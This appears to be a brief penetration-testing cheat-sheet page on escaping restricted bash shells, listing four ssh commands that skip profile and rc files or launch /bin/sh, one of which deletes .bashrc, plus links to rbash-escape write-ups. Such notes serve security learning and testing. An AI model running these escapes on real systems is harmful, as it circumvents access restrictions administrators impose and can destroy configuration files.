# bypass bash restrictions

## ssh (most common)

```bash
ssh user@IP -t "bash --noprofile"
ssh -t user@IP bash --norc --noprofile
ssh -t user@IP /bin/sh
ssh -t user@IP "bash --norc --noprofile -c '/bin/rm .bashrc'"

```

## References

{% embed url="https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions" %}

{% embed url="https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques" %}

{% embed url="https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape" %}
